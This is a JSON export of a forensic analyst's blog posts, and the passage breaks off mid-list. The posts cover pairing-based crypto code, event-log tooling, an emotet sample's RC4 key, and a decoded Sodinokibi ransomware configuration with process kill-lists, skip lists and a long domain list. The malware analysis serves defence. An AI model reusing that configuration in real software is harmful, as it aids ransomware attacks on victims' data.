Rust","description":"Because I was was fed up with catching memory issues in the legacy PBC code, I decided to reimplement the PBC library using Rust. You can watch my progress at https://github.com/teeshop/pbc4rust.","date":"2021-02-13T00:00:00.000Z","tags":[],"readingTime":0.775,"hasTruncateMarker":false,"authors":[{"name":"Jan Starke","title":"Senior Forensic Analyst","url":"https://github.com/janstarke","imageURL":"https://github.com/janstarke.png","key":"jasa"}],"frontMatter":{"layout":"post","title":"Pairing based cryptography in Rust","date":"2021-02-13T00:00:00.000Z","categories":"rust crypto","authors":["jasa"]},"unlisted":false,"prevItem":{"title":"DoSing TLS endpoints","permalink":"/blog/2021/03/25/DoSing-TLS-endpoints"},"nextItem":{"title":"Using Pairing-based cryptography in Java","permalink":"/blog/2021/02/05/Using_pairing_based_cryptography_in_Java"}},"content":"Because I was was fed up with catching memory issues in the legacy PBC code, I decided to reimplement the PBC library using Rust. You can watch my progress at [https://github.com/teeshop/pbc4rust](https://github.com/teeshop/pbc4rust).\\n\\nBy the way, I like the concept of traits. This enables me to rely on the rules of universal algebra. So, my first unit tests look like this:\\n\\n```rust\\n#[test]\\nfn test_z_add_zero() {\\n    let a: Z = Z::from(12345 as i32);\\n    assert_eq!(&a + &Z::zero(), a);\\n    assert_eq!(&Z::zero() + &a, a);\\n}\\n\\n#[test]\\nfn test_z_add_commutativity() {\\n    let a: Z = Z::from(12345 as i32);\\n    let c: Z = Z::from(6789 as i32);\\n    assert_eq!(&a + &c, &c + &a);\\n}\\n\\n#[test]\\nfn test_z_add_associativity() {\\n    let a: Z = Z::from(1234 as i32);\\n    let b: Z = Z::from(3456 as i32);\\n    let c: Z = Z::from(91 as i32);\\n    let d: Z = Z::from(1234 + 3456 + 91 as i32);\\n    assert_eq!(&a + &(&b + &c), d);\\n    assert_eq!(&(&a + &b) + &c, d);\\n}\\n```"},{"id":"/2021/02/05/Using_pairing_based_cryptography_in_Java","metadata":{"permalink":"/blog/2021/02/05/Using_pairing_based_cryptography_in_Java","source":"@site/blog/2021-02-05-Using_pairing_based_cryptography_in_Java.mdx","title":"Using Pairing-based cryptography in Java","description":"Since some years I\'m working on this topic, and guess what-)","date":"2021-02-05T00:00:00.000Z","tags":[],"readingTime":3.855,"hasTruncateMarker":false,"authors":[{"name":"Jan Starke","title":"Senior Forensic Analyst","url":"https://github.com/janstarke","imageURL":"https://github.com/janstarke.png","key":"jasa"}],"frontMatter":{"layout":"post","title":"Using Pairing-based cryptography in Java","date":"2021-02-5","categories":"java crypto","authors":["jasa"]},"unlisted":false,"prevItem":{"title":"Pairing based cryptography in Rust","permalink":"/blog/2021/02/13/Pairing_based_cryptography_in_Rust"},"nextItem":{"title":"Some emotet variants use bad crypto (in the first stage)","permalink":"/blog/2021/01/25/some-emotet-variants-use-bad-crypto-in-the-first-stage"}},"content":"Since some years I\'m working on this topic, and guess what: It is working now :-)\\n\\n# What should I need Pairing-based cryptography for?\\n\\nImagine the following: You are in a hospital and get some test results (e.g. from a Covid-19 test). You want to protect the result by encrypting it, but you are not sure who needs to be able to read that result later. But you don\'t want to decrypt and reencrypt the result later. This is, where PBC comes in play. You can do as 2nd-level encryption, which protects the data from being read by any person. To decrypt 2nd-level encrypted data, you must first convert that to 1st-level-encrypted data, which requires the public key of the person you want to grant access to you data, and your own private key. After this step, the person for who you created the 1st-level encrypted data can decrypt the data using its own private key.\\n\\nThis enables the following use cases:\\n\\n* Storage of confidential data in a cloud which you don\'t trust, while giving partners access to your data. This works as long as the cloud provider doesn\'t know any private keys. It even allows the cloud provider to do the transformation from 2nd-level to 1st-level, if you calculate the reencryption-key on-premise.\\n* Revocation of data access by revoking the reencryption key.\\n\\n# What happened until now? \\n\\nMy starting point is the **PBC Library** [https://crypto.stanford.edu/pbc/](https://crypto.stanford.edu/pbc/) which was written by Ben Lynn as part of his PhD thesis. To use this in a prototyping project, we had to transmit encrypted content and key material from one computer to another. So we needed a machine-independant representation of all of the data, which was not subject of **PBC Library**. So, we wrapped all the data structures used in **PBC Library** by C++-based structures. After this, it was possible to easily export and import cryptographic data using\\n\\n* any data format, such as JSON, ASN.1, XML, ...\\n* any other PBC library (lower case L).\\n\\nOur next challenge was to make the C++ library accessible for higher level languages, such as Java (required for Android devices as well as Java Backends) or Swift (required for iOS devices). As of today, we succeeded. The following is running:\\n\\n```java\\npackage com.company;\\nimport com.tsystems_mms.je2ee.*;\\n\\npublic class Main {\\n\\n    static {\\n        System.loadLibrary(\\"je2ee\\");\\n    }\\n\\n    private static final char[] HEX_ARRAY = \\"0123456789ABCDEF\\".toCharArray();\\n    public static String bytesToHex(byte[] bytes) {\\n        char[] hexChars = new char[bytes.length * 2];\\n        for (int j = 0; j < bytes.length; j++) {\\n            int v = bytes[j] & 0xFF;\\n            hexChars[j * 2] = HEX_ARRAY[v >>> 4];\\n            hexChars[j * 2 + 1] = HEX_ARRAY[v & 0x0F];\\n        }\\n        return new String(hexChars);\\n    }\\n\\n    public static void main(String[] args) {\\n        PbcContext context = je2ee.createContext();\\n        GlobalParameters global = je2ee.getGlobal(context);\\n\\n        KeyPair kp = je2ee.createKeyPair(global);\\n        Element dek = je2ee.generateDataEncryptionKey(global);\\n\\n        byte[] aesKey1 = je2ee.kdf256(dek);\\n        Tuple ciphertext = je2ee.encryptFirstLevel(je2ee.publicKey(kp), dek);\\n        Element decryptedDek = je2ee\\n            .decryptFirstLevel(je2ee.secretKey(kp), ciphertext);\\n\\n        byte[] aesKey2 = je2ee.kdf256(decryptedDek);\\n\\n        String aes1 = bytesToHex(aesKey1);\\n        String aes2 = bytesToHex(aesKey2);\\n\\n        assert aes1.equals(aes2);\\n        System.out.println(aes2);\\n    }\\n}\\n```\\n\\n# Where can I get the code?\\n\\nYou need to recursively clone the following repo: [https://github.com/T-Systems-MMS/libe2ee](https://github.com/T-Systems-MMS/libe2ee)\\n\\n# Can I use this for my project?\\n\\nYes, you can, but **YOU SHOULDN\'T**! This project is a prototype and is only made to show what\'s possible. Neither **PBC Library** nor this very project has been checked thoroughly by cryptography experts. I do not give any guarantee that this code is secure against any attacks. Maybe if someone is willing to pay for it, it may be possible to raise this code to production level. Until then, this is only a freetime project of myself.\\n\\n# Some insights...\\n\\n## Example of a public key in machine independent format\\n\\n```json\\n{\\n    \\"root\\": {\\n        \\"id\\": \\"a990af45-2269-537b-95c0-2d1815c6bddb\\",\\n        \\"type\\": \\"element\\"\\n    },\\n    \\"a990af45-2269-537b-95c0-2d1815c6bddb\\": {\\n        \\"type\\": \\"element\\",\\n        \\"id\\": \\"a990af45-2269-537b-95c0-2d1815c6bddb\\",\\n        \\"field\\": \\"3709e538-b580-5e21-a2ae-333585123e35\\",\\n        \\"y\\": \\"d5TgGd3TwTiVhhdZpQ6L0BS5YqdzIxQVK4ZTPANMqNVvCo1qdeKSz2HZnPKqM9mazGKGZcwG9toinepFSmMvcf\\",\\n        \\"x\\": \\"AiblhfGZ24J3IA1MNyfKaV3HGMHyCIngbR2sU9D5QyZc5IJV8yxXUGQpbiGBQ3I8N8DXgHQ1dSOKYilloO5BOq\\"\\n    },\\n    \\"3709e538-b580-5e21-a2ae-333585123e35\\": {\\n        \\"type\\": \\"field\\",\\n        \\"subtype\\": \\"curve\\",\\n        \\"id\\": \\"3709e538-b580-5e21-a2ae-333585123e35\\",\\n        \\"order\\": \\"aWgEPTl1tmebfs3ZETd8TJLcWlT\\",\\n        \\"pairing\\": \\"86ec11e5-802e-5ea0-9cc6-5a429f653359\\",\\n        \\"a\\": \\"a4cb7d3e-d31e-5472-9928-0b17725c9ae4\\",\\n        \\"b\\": \\"a47e3ca0-d570-5fe4-bd87-245b0100dbc2\\",\\n        \\"cofac\\": \\"1iRiNwETOuqBD7ugR7bRatbQL7JDKXfb6QfKFlQdbxb46gQKAjLCS397ZbnU\\"\\n    },\\n    \\"86ec11e5-802e-5ea0-9cc6-5a429f653359\\": {\\n        \\"type\\": \\"pairing\\",\\n        \\"id\\": \\"86ec11e5-802e-5ea0-9cc6-5a429f653359\\",\\n        \\"G1\\": \\"3709e538-b580-5e21-a2ae-333585123e35\\",\\n        \\"G2\\": \\"3709e538-b580-5e21-a2ae-333585123e35\\",\\n        \\"GT\\": \\"6e9b64ba-e391-5c46-a9b9-0527b3c22212\\",\\n        \\"Zr\\": \\"a6d00cef-ce1b-5410-bd45-41a0058b4540\\",\\n        \\"Eq\\": \\"3709e538-b580-5e21-a2ae-333585123e35\\",\\n        \\"Fq\\": \\"49f4d9d3-3110-5d68-a069-d035ef71b54b\\",\\n        \\"Fq2\\": \\"df25d091-9992-5b89-9ab7-487678fbd9d3\\",\\n        \\"r\\": \\"aWgEPTl1tmebfs3ZETd8TJLcWlT\\",\\n        \\"phikonr\\": \\"1iRiNwETOuqBD7ugR7bRatbQL7JDKXfb6QfKFlQdbxb46gQKAjLCS397ZbnU\\"\\n    },\\n    \\"6e9b64ba-e391-5c46-a9b9-0527b3c22212\\": {\\n        \\"type\\": \\"field\\",\\n        \\"subtype\\": \\"mulg\\",\\n        \\"id\\": \\"6e9b64ba-e391-5c46-a9b9-0527b3c22212\\",\\n        \\"order\\": \\"aWgEPTl1tmebfs3ZETd8TJLcWlT\\",\\n        \\"pairing\\": \\"86ec11e5-802e-5ea0-9cc6-5a429f653359\\",\\n        \\"base\\": \\"df25d091-9992-5b89-9ab7-487678fbd9d3\\"\\n    },\\n    \\"df25d091-9992-5b89-9ab7-487678fbd9d3\\": {\\n        \\"type\\": \\"field\\",\\n        \\"subtype\\": \\"fi\\",\\n        \\"id\\": \\"df25d091-9992-5b89-9ab7-487678fbd9d3\\",\\n        \\"order\\": \\"11QugYb4N8ouqquotyF8IDXtacHwMTbO0nzw4DSKv860wA8OmQwaM5NwQDuGzdsaq7qNH2vjKAZYuuiiAkgzugeZZJGzPCyBalRcL5Un43QnC77oOh4PwFfDudE7kPVfi9kMYY9ETj6JjicbhyWKqsrYaU4WMTQfwjMsA1IwD08m1\\",\\n        \\"pairing\\": \\"86ec11e5-802e-5ea0-9cc6-5a429f653359\\",\\n        \\"base\\": \\"49f4d9d3-3110-5d68-a069-d035ef71b54b\\"\\n    },\\n    \\"49f4d9d3-3110-5d68-a069-d035ef71b54b\\": {\\n        \\"type\\": \\"field\\",\\n        \\"subtype\\": \\"montfp\\",\\n        \\"id\\": \\"49f4d9d3-3110-5d68-a069-d035ef71b54b\\",\\n        \\"order\\": \\"10iCaKEy0HbDHT6PP7xruLvQ6exXF4OXOWMsLG1cWzUGqHPKb3iHXFPHp5i6InsKwpSoCRA0udlrariW7VXEft1\\",\\n        \\"modulus\\": \\"10iCaKEy0HbDHT6PP7xruLvQ6exXF4OXOWMsLG1cWzUGqHPKb3iHXFPHp5i6InsKwpSoCRA0udlrariW7VXEft1\\",\\n        \\"negpinv\\": \\"KdbJ0wZgOLZ\\",\\n        \\"R\\": \\"Y3IcJ7iNkOkQg5TzeRWCJ5hLYyIjT6hZsVtkHTRaFzT7sr2lxvr37CT7VuW77EbDxq0kazOYLhOdzC31vZhUzz\\",\\n        \\"R3\\": \\"ebReJS6QeiIxqNFKFf4H01oKlyOviNcOAYf0Ksc4DVIJ8Uk1AxsCiwdUCbzMFFEwkBwtsN5OHZ7ThgIxHNwAq8\\"\\n    },\\n    \\"a6d00cef-ce1b-5410-bd45-41a0058b4540\\": {\\n        \\"type\\": \\"field\\",\\n        \\"subtype\\": \\"montfp\\",\\n        \\"id\\": \\"a6d00cef-ce1b-5410-bd45-41a0058b4540\\",\\n        \\"order\\": \\"aWgEPTl1tmebfs3ZETd8TJLcWlT\\",\\n        \\"modulus\\": \\"aWgEPTl1tmebfs3ZETd8TJLcWlT\\",\\n        \\"negpinv\\": \\"1\\",\\n        \\"R\\": \\"01lnGH9GscRlVEuYE2YC\\",\\n        \\"R3\\": \\"2HXdeLEYzbwUJfGOVzp6EZRig0e\\"\\n    },\\n    \\"a4cb7d3e-d31e-5472-9928-0b17725c9ae4\\": {\\n        \\"type\\": \\"element\\",\\n        \\"id\\": \\"a4cb7d3e-d31e-5472-9928-0b17725c9ae4\\",\\n        \\"field\\": \\"49f4d9d3-3110-5d68-a069-d035ef71b54b\\",\\n        \\"x\\": \\"1\\"\\n    },\\n    \\"a47e3ca0-d570-5fe4-bd87-245b0100dbc2\\": {\\n        \\"type\\": \\"element\\",\\n        \\"id\\": \\"a47e3ca0-d570-5fe4-bd87-245b0100dbc2\\",\\n        \\"field\\": \\"49f4d9d3-3110-5d68-a069-d035ef71b54b\\",\\n        \\"x\\": \\"0\\"\\n    }\\n}\\n```"},{"id":"/2021/01/25/some-emotet-variants-use-bad-crypto-in-the-first-stage","metadata":{"permalink":"/blog/2021/01/25/some-emotet-variants-use-bad-crypto-in-the-first-stage","source":"@site/blog/2021-01-25-some-emotet-variants-use-bad-crypto-in-the-first-stage.mdx","title":"Some emotet variants use bad crypto (in the first stage)","description":"What can I say? I recently analyzed an emotet variant which I found in a customer network. Eventually, I found that a new PE binary was being encrypted and loaded into memory. As encryption, simple RC4 was being used, with a static key @nw<jss6fG3Na4jvh^c&4Cgp$*rZ<g?TD@%FgTnwg3, hashed with MD5, which results in 21755ce816bd55c92f57eb4fd2060197 as RC4 key.","date":"2021-01-25T00:00:00.000Z","tags":[{"inline":true,"label":"forensics","permalink":"/blog/tags/forensics"}],"readingTime":0.445,"hasTruncateMarker":false,"authors":[{"name":"Jan Starke","title":"Senior Forensic Analyst","url":"https://github.com/janstarke","imageURL":"https://github.com/janstarke.png","key":"jasa"}],"frontMatter":{"title":"Some emotet variants use bad crypto (in the first stage)","date":"2021-01-25","categories":["allgemein"],"tags":["forensics"],"layout":"post","authors":["jasa"]},"unlisted":false,"prevItem":{"title":"Using Pairing-based cryptography in Java","permalink":"/blog/2021/02/05/Using_pairing_based_cryptography_in_Java"},"nextItem":{"title":"Importing Windows Event Logs into Elasticsearch","permalink":"/blog/2021/01/01/importing-windows-event-logs-into-elasticsearch"}},"content":"What can I say? I recently analyzed an emotet variant which I found in a customer network. Eventually, I found that a new PE binary was being encrypted and loaded into memory. As encryption, simple RC4 was being used, with a static key `@nw<jss6fG3Na4jvh^c&4Cgp$*rZ<g?TD@%FgTnwg3`, hashed with MD5, which results in `21755ce816bd55c92f57eb4fd2060197` as RC4 key.\\n\\n[![](/img/2021-01-25-some-emotet-variants-use-bad-crypto-in-the-first-stage/key_generation.png)](/img/2021-01-25-some-emotet-variants-use-bad-crypto-in-the-first-stage/key_generation.png)\\n\\nFortunately, it was not necessary to do the decryption on my own. I could simply set a breakpoint after 0x100013B5 and could read the resulting plaintext PE image.\\n\\nI instantly uploaded it to https://www.virustotal.com/gui/file/f6d224a8af3d56e8d17ccea43a8ac6791e658b656e481630a770716b6116fc0c/detection"},{"id":"/2021/01/01/importing-windows-event-logs-into-elasticsearch","metadata":{"permalink":"/blog/2021/01/01/importing-windows-event-logs-into-elasticsearch","source":"@site/blog/2021-01-01-importing-windows-event-logs-into-elasticsearch.mdx","title":"Importing Windows Event Logs into Elasticsearch","description":"Historically, there were two options to import Windows Event Logs into Elasticsearch:","date":"2021-01-01T00:00:00.000Z","tags":[],"readingTime":0.515,"hasTruncateMarker":false,"authors":[{"name":"Jan Starke","title":"Senior Forensic Analyst","url":"https://github.com/janstarke","imageURL":"https://github.com/janstarke.png","key":"jasa"}],"frontMatter":{"title":"Importing Windows Event Logs into Elasticsearch","date":"2021-01-01","categories":["allgemein"],"layout":"post","authors":["jasa"]},"unlisted":false,"prevItem":{"title":"Some emotet variants use bad crypto (in the first stage)","permalink":"/blog/2021/01/25/some-emotet-variants-use-bad-crypto-in-the-first-stage"},"nextItem":{"title":"Does Sodinokibi use bad crypto?","permalink":"/blog/2020/01/08/does-sodinokibi-use-bad-crypto"}},"content":"Historically, there were two options to import Windows Event Logs into Elasticsearch:\\n\\n- using Winlogbeat, which requires a running Windows machine\\n- using plaso, which works only with complete images, but not with triage data, such as some `evtx` files. Additionally, plaso doesn\'t soupport elasticsearch 7 or above, so this is not an option.\\n\\nAs a result, I decided to implement a script which imports a bunch of `evtx` files into an elasticsearch index:\\n\\n[https://github.com/teeshop/evtxtools](https://github.com/teeshop/evtxtools)\\n\\nAt the moment, you need to create an own index template to make sure that all `event_data` fields are imported as `text`: No index template is required anymore."},{"id":"/2020/01/08/does-sodinokibi-use-bad-crypto","metadata":{"permalink":"/blog/2020/01/08/does-sodinokibi-use-bad-crypto","source":"@site/blog/2020-01-08-does-sodinokibi-use-bad-crypto.mdx","title":"Does Sodinokibi use bad crypto?","description":"During the last days I was able to analyze a sample of the Sodinokibi ransomware (9fde430060112b2ebe83536cfd9de49d0cda04be1e7d83d848fbf68b30855fde).","date":"2020-01-08T00:00:00.000Z","tags":[],"readingTime":3.72,"hasTruncateMarker":false,"authors":[{"name":"Jan Starke","title":"Senior Forensic Analyst","url":"https://github.com/janstarke","imageURL":"https://github.com/janstarke.png","key":"jasa"}],"frontMatter":{"title":"Does Sodinokibi use bad crypto?","date":"2020-01-08","categories":["forensics","malware"],"layout":"post","authors":["jasa"]},"unlisted":false,"prevItem":{"title":"Importing Windows Event Logs into Elasticsearch","permalink":"/blog/2021/01/01/importing-windows-event-logs-into-elasticsearch"},"nextItem":{"title":"New Malware: \\"Pro InvoiceWMZ45445\\"","permalink":"/blog/2015/12/01/new-malware-pro-invoicewmz45445"}},"content":"During the last days I was able to analyze a sample of the Sodinokibi ransomware (9fde430060112b2ebe83536cfd9de49d0cda04be1e7d83d848fbf68b30855fde).\\n\\nDuring the dynamic investigation I discovered that the malware contains a PE section named `.lfge4i`. The content of this section is being decoded during execution and contains the following content (I formatted it to improve readability):\\n\\n```json\\n {\\n   \\"pk\\":\\"3sB5vqBW0kuO3Nr56Ql+TMjaDchoEjxcKxBA/XbSJks=\\",\\n   \\"pid\\":\\"48\\",\\n   \\"sub\\":\\"2360\\",\\n   \\"dbg\\":false,\\n   \\"fast\\":false,\\n   \\"wipe\\":true,\\n   \\"wht\\":{\\n      \\"fld\\":[\\n         \\"$windows.~bt\\",\\n         \\"program files\\",\\n         \\"google\\",\\n         \\"program files (x86)\\",\\n         \\"boot\\",\\n         \\"msocache\\",\\n         \\"system volume information\\",\\n         \\"mozilla\\",\\n         \\"application data\\",\\n         \\"appdata\\",\\n         \\"perflogs\\",\\n         \\"tor browser\\",\\n         \\"programdata\\",\\n         \\"windows\\",\\n         \\"$recycle.bin\\",\\n         \\"$windows.~ws\\",\\n         \\"windows.old\\",\\n         \\"intel\\"\\n      ],\\n      \\"fls\\":[\\n         \\"iconcache.db\\",\\n         \\"bootfont.bin\\",\\n         \\"bootsect.bak\\",\\n         \\"thumbs.db\\",\\n         \\"ntuser.ini\\",\\n         \\"ntldr\\",\\n         \\"autorun.inf\\",\\n         \\"boot.ini\\",\\n         \\"ntuser.dat\\",\\n         \\"desktop.ini\\",\\n         \\"ntuser.dat.log\\"\\n      ],\\n      \\"ext\\":[\\n         \\"com\\",\\n         \\"bat\\",\\n         \\"cur\\",\\n         \\"scr\\",\\n         \\"diagpkg\\",\\n         \\"lnk\\",\\n         \\"icl\\",\\n         \\"diagcfg\\",\\n         \\"lock\\",\\n         \\"msc\\",\\n         \\"msu\\",\\n         \\"ani\\",\\n         \\"cpl\\",\\n         \\"386\\",\\n         \\"hta\\",\\n         \\"cmd\\",\\n         \\"ocx\\",\\n         \\"shs\\",\\n         \\"hlp\\",\\n         \\"exe\\",\\n         \\"ico\\",\\n         \\"nls\\",\\n         \\"adv\\",\\n         \\"bin\\",\\n         \\"icns\\",\\n         \\"theme\\",\\n         \\"drv\\",\\n         \\"wpx\\",\\n         \\"spl\\",\\n         \\"cab\\",\\n         \\"msstyles\\",\\n         \\"sys\\",\\n         \\"msi\\",\\n         \\"themepack\\",\\n         \\"msp\\",\\n         \\"mpa\\",\\n         \\"deskthemepack\\",\\n         \\"key\\",\\n         \\"idx\\",\\n         \\"mod\\",\\n         \\"rom\\",\\n         \\"prf\\",\\n         \\"nomedia\\",\\n         \\"dll\\",\\n         \\"diagcab\\",\\n         \\"ps1\\",\\n         \\"ics\\",\\n         \\"rtp\\",\\n         \\"ldf\\"\\n      ]\\n   },\\n   \\"wfld\\":[\\n      \\"backup\\"\\n   ],\\n   \\"prc\\":[\\n      \\"xfssvccon\\",\\n      \\"thebat\\",\\n      \\"firefox\\",\\n      \\"dbsnmp\\",\\n      \\"synctime\\",\\n      \\"mydesktopqos\\",\\n      \\"msaccess\\",\\n      \\"outlook\\",\\n      \\"tbirdconfig\\",\\n      \\"isqlplussvc\\",\\n      \\"mydesktopservice\\",\\n      \\"steam\\",\\n      \\"visio\\",\\n      \\"wordpad\\",\\n      \\"winword\\",\\n      \\"infopath\\",\\n      \\"agntsvc\\",\\n      \\"mspub\\",\\n      \\"ocomm\\",\\n      \\"ocautoupds\\",\\n      \\"encsvc\\",\\n      \\"powerpnt\\",\\n      \\"thunderbird\\",\\n      \\"oracle\\",\\n      \\"onenote\\",\\n      \\"sql\\",\\n      \\"excel\\",\\n      \\"ocssd\\",\\n      \\"dbeng50\\",\\n      \\"sqbcoreservice\\"\\n   ],\\n   \\"dmn\\":\\"letterscan.de;evsynthacademy.org;avtoboss163.ru:443;brinkdoepke.eu;cp-bap.de;landgoedspica.nl;greenrider.nl;lunoluno.com;cymru.futbol;kdbrh.com;from02pro.com;thegrinningmanmusical.com;cleanroomequipment.ie;jlgraphisme.fr;awaisghauri.com;internalresults.com;internestdigital.com;pajagus.fr;larchwoodmarketing.com;askstaffing.com;beandrivingschool.com.au;utilisacteur.fr;ziliak.com;auberives-sur-vareze.fr;aheadloftladders.co.uk;ox-home.com;liverpoolabudhabi.ae;jayfurnitureco.com;agriturismocastagneto.it;jmmartinezilustrador.com;airserviceunlimited.com;nginx.com;amelielecompte.wordpress.com;eurethicsport.eu;funworx.de;hotelturbo.de;collegetennis.info;successcolony.com.ng;gardenpartner.pl;cotton-avenue.co.il;k-v-f.de;sarahspics.co.uk;phukienbepthanhdat.com;devus.de;universelle.fr;fla.se;hekecrm.com;agendatwentytwenty.com;tastevirginia.com;geoweb.software;valiant-voice.com;webforsites.com;tbalp.co.uk;espaciopolitica.com;jalkapuu.net;rossomattonecase.it;pedmanson.com;globalskills.pt;epsondriversforwindows.com;suitesartemis.gr;drvoip.com;dayenne-styling.nl;eastgrinsteadwingchun.com;boloria.de;muni.pe;angelsmirrorus.com;bcmets.info;mundo-pieces-auto.fr;makingmillionaires.net;yvesdoin-aquarelles.fr;furland.ru;saboboxtel.uk;baikalflot.ru;anleggsregisteret.no;yuanshenghotel.com;hnkns.com;ygallerysalonsoho.com:443;gavelmasters.com;chinowarehousespace.com;strauchs-wanderlust.info;bulyginnikitav.000webhostapp.com;lexced.com;iexpert99.com;lgiwines.com;kellengatton.com;sytzedevries.com;veggienessa.com;antesacademy.it;mustangmarketinggroup.com;professionetata.com;alcye.com;mieleshopping.it;digitale-elite.de;floweringsun.org;frankgoll.com;kryddersnapsen.dk;christianscholz.de;tatyanakopieva.ru;uci-france.fr;zdrowieszczecin.pl;kickittickets.com;denhaagfoodie.nl;bodet150ans.com;fbmagazine.ru;cookinn.nl;vdolg24.online;onlinetvgroup.com;abulanov.com;renderbox.ch;jaaphoekzema.nl;oportowebdesign.com;queertube.net;frimec-international.es;klapanvent.ru;indiebizadvocates.org;miscbo.it;aktivfriskcenter.se;yourcosmicbeing.com;t3brothers.com;springfieldplumbermo.com;saint-malo-developpement.fr;innovationgames-brabant.nl;bohrlochversicherung.info;bertbutter.nl;3daywebs.com;forextimes.ru;dentallabor-luenen.de;specialtyhomeservicesllc.com;molinum.pt;cmeow.com;teethinadaydentalimplants.com;mrmac.com;acornishstudio.co.uk;ronaldhendriks.nl;jlwilsonbooks.com;campusce.com;kryptos72.com;levencovka.ru;stressreliefadvice.com;sjtpo.org;harleystreetspineclinic.com;dentourage.com;elex.is;fotoeditores.com;mursall.de;hostingbangladesh.net;alnectus.com;unexplored.gr;reputation-medical.online;smartspeak.com;sololibrerie.it;janasfokus.com;fixx-repair.com;agenceassemble.fr;unboxtherapy.site;bundan.com;arazi.eus;patassociation.com;magrinya.net;hotjapaneselesbian.com;lovcase.com;morgansconsult.com;skinkeeper.li;omnicademy.com;tetameble.pl;albcleaner.fr;fotoslubna.com;nrgvalue.com;elitkeramika-shop.com.ua;mariamalmahdi.com;wademurray.com;testitjavertailut.net;skidpiping.de;ya-elka.ru;alharsunindo.com;theboardroomafrica.com;theintellect.edu.pk;matteoruzzaofficial.com;jimprattmediations.com;vapiano.fr;perceptdecor.com;gurutechnologies.net;photonag.com;laaisterplakky.nl;globalcompliancenews.com;voice2biz.com;phoenixcrane.com;mondolandscapes.com;datatri.be;scotlandsroute66.co.uk;slotenmakerszwijndrecht.nl;a-zpaperwork.eu;descargandoprogramas.com;cincinnatiphotocompany.org;directique.com;claudiakilian.de;sealgrinderpt.com;stringnosis.academy;arabianmice.com;bjornvanvulpen.nl;jdscenter.com;pokemonturkiye.com;billyoart.com;the-beauty-guides.com;kompresory-opravy.com;mjk.digital;slotspinner.com;enactusnhlstenden.com;hvitfeldt.dk;julielusktherapy.com;juergenblaetz.de;tweedekansenloket.nl;carolynfriedlander.com;leadforensics.com;protoplay.ca;ronielyn.com;lsngroupe.com;richardmaybury.co.uk;oro.ae;nauticmarine.dk;whoopingcrane.com;towelroot.co;prodentalblue.com;mazzaropi.com.br;clemenfoto.dk;comoserescritor.com;modamarfil.com;wallflowersandrakes.com;awag-blog.de;goodherbalhealth.com;ivancacu.com;kelsigordon.com;primemarineengineering.com;linkbuilding.life;jobstomoveamerica.org;scietech.academy;apiarista.de;goodboyscustom.com;jeanmonti.com;greeneyetattoo.com;boomerslivinglively.com;rozmata.com;so-sage.fr;andreaskildegaard.dk;hutchstyle.co.uk;atrgroup.it;witraz.pl;leopoldineroux.com;katherinealy.com;angeleyezstripclub.com;geitoniatonaggelon.gr;acb-gruppe.ch;hostastay.com;quitescorting.com;malzomattalar.com;scentedlair.com;o2o-academy.com;alpesiberie.com;reizenmetkinderen.be;aslog.fr;lagschools.ng;monstarrsoccer.com;mbuildinghomes.com;altitudeboise.com;stitch-n-bitch.com;holocine.de;werkzeugtrolley.net;limounie.com;lapponiasafaris.com;markseymourphotography.co.uk;fire-space.com;transifer.fr;bmw-i-pure-impulse.com;ruggestar.ch;malevannye.ru;curtsdiscountguns.com;ultimatelifesource.com;lattalvor.com;operativadigital.com;buerocenter-butzbach-werbemittel.de;advanced-removals.co.uk;artvark.nl;eksperdanismanlik.com;alattekniksipil.com;focuskontur.com;latteswithleslie.com;goeppinger-teppichreinigung.de;advancedeyecare.com;silkeight.com;theater-lueneburg.de;hameghlim.com;bridalcave.com;turing.academy;marmarabasin.com;bodymindchallenger.com;o90.dk;g2mediainc.com;smarttourism.academy;xn--ziinoapte-6ld.ro;computer-place.de;distrifresh.com;test-teleachat.fr;rhino-storage.co.uk;mediogiro.com.ar;spartamovers.com;circuit-diagramz.com;blavait.fr;adedesign.com;sshomme.com;vipcarrental.ae;bg.szczecin.pl;craftingalegacy.com;tzn.nu;acumenconsultingcompany.com;kroophold-sjaelland.dk;flossmoordental.com;simpleitsolutions.ch;tilldeeke.de;martinipstudios.com;sochi-okna23.ru;foerderverein-vatterschule.de;carmel-york.com;metriplica.academy;axisoflove.org:443;heuvelland-oaze.nl;putzen-reinigen.com;physio-lang.de;skolaprome.eu;lmmont.sk;boyfriendsgoal.site;edrickennedymacfoy.com;cuadc.org;thenalpa.com;startuplive.org;finsahome.co.uk;heimdalbygg.no;stoneridgemontessori.com;inewsstar.com;carsten.sparen-it.de;fann.ru;topautoinsurers.net;mazift.dk;line-x.co.uk;hoteltantra.com;graygreenbiomedservices.com;powershell.su;spectamarketingdigital.com.br;wrinstitute.org;scholarquotes.com;rsidesigns.com;levelseven.be;narca.net;relevantonline.eu;jollity.hu;walterman.es;campusescalade.com;slideevents.be;diakonie-weitramsdorf-sesslach.de;brighthillgroup.com;perfectgrin.com;initconf.com;loparnille.se;nuohous.com;mesajjongeren.nl;pazarspor.org.tr;cssp-mediation.org;gta-jjb.fr;centuryvisionglobal.com;ownidentity.com;rivermusic.nl;imagine-entertainment.com;linearete.com;publicompserver.de;allinonecampaign.com;keuken-prijs.nl;bumbipdeco.site;alwaysdc.com;sprintcoach.com;drbenveniste.com;buzzneakers.com;dmlcpa.com;edvestors.org;dcc-eu.com;nalliasmali.net;hepishopping.com;worldproskitour.com;sachainchiuk.com;michaelfiegel.com;kafkacare.com;mikegoodfellow.co.uk;rolleepollee.com;almamidwifery.com;hawaiisteelbuilding.com;bluelakevision.com;mike.matthies.de;afbudsrejserallinclusive.dk;trainiumacademy.com;insane.agency;peppergreenfarmcatering.com.au;2020hindsight.info;mangimirossana.it;ebible.co;leloupblanc.gr;avisioninthedesert.com;sbit.ag;maxcube24.com.ua;oexebusiness.com;vitoriaecoturismo.com.br;christopherhannan.com;mercadodelrio.com;ikzoekgod.be;glas-kuck.de;kartuindonesia.com;orchardbrickwork.com;bescomedical.de;mediabolmong.com;maryairbnb.wordpress.com;dreamvoiceclub.org;housesofwa.com;paprikapod.com;csaballoons.com;ikadomus.com;mac-computer-support-hamburg.de;die-immo-agentur.de;licensed-public-adjuster.com;fysiotherapierijnmond.nl;nutriwell.com.sg;rattanwarehouse.co.uk;alaskaremote.com;eos-horlogerie.com;karelinjames.com;pourlabretagne.bzh;iactechnologies.net;ingresosextras.online;jakubrybak.com;nicksrock.com;ykobbqchicken.ca;netadultere.fr;nvisionsigns.com;production-stills.co.uk;onesynergyinternational.com;placermonticello.com;schlagbohrmaschinetests.com;mamajenedesigns.com;pankiss.ru;olry-cloisons.fr;rarefoods.ro;agrifarm.dk;betterce.com;kemtron.fr;littlesaints.academy;keyboardjournal.com;hinotruckwreckers.c